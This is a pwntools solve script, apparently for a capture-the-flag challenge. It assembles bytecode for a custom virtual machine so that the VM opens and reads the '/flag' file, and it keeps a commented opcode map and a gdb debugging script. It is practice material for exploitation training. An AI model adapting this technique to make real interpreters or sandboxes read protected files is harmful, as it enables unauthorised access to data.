#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb='''
set disassembly-flavor intel
break open
display/26g $rsp
display/8i $rip
display/x $rax
display/x $rdi
display/x $rsi
display/x $rdx
c
'''

'''
mov = 0x08
add = 0x80
stk = 0x10
stm = 0x20
ldm = 0x02
cmp = 0x04
jmp = 0x40
sys = 0x01
    
0x404 rsp = 0x04
0x405 rip = 0x20
0x400   a = 0x01
0x401   b = 0x40
0x402   c = 0x10
0x403   d = 0x08
0x406   f = 0x02
'''

#[op][value][register]

def _compile():
    flag = ["2f", "66", "6c", "61", "67", "00"] # /flag\0
    shellcode = ""
    for v in flag:
        shellcode += f"08{v}01" # mov byte into register
        shellcode += "100100"   # push onto stack
    shellcode += "080101"       # mov a (rdi) 01
    shellcode += "080240"       # mov b (rsi) = 0x02
    shellcode += "08ff10"       # mov c (rdx) = 0xff
    shellcode += "01011b"       # open(*rsp, O_RDWR) && read(fd, 0x02, ff)
    return bytes.fromhex(shellcode)

def runner():
    p = process()
    #p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])
    code = _compile()
    p.recv()
    p.send(code)
    print(p.recv().decode())
    print(p.recv().decode())
    p.close()
    p.kill()

if __name__ == '__main__':
    runner()
